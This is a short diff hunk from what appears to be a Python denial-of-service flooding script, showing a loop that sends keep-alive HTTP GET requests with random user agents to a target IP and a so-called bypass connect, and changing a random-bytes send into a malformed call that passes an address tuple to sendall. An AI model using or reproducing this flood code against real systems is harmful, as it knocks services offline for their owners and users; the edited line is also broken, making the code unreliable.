@@ -3708,7 +3708,7 @@ for x in range(20000):
             a.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())
             print("HTTP SENDED")
             a.sendall(str.encode(request))
-            a.sendall(random._urandom(50411), (ip, port))
+            a.sendall((ip, port))
             s.connect((ip, dport)) # SYN REPORT (BYPASS)
             print("BYPASS SENDED")
             
